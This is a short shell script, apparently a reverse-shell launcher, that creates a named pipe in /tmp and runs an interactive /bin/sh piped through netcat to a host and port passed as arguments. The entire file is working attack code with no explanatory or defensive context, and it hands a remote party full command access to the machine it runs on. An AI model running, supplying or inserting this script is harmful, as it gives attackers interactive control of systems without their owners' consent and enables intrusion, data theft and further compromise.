#!/bin/sh

rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc $1 $2 > /tmp/f
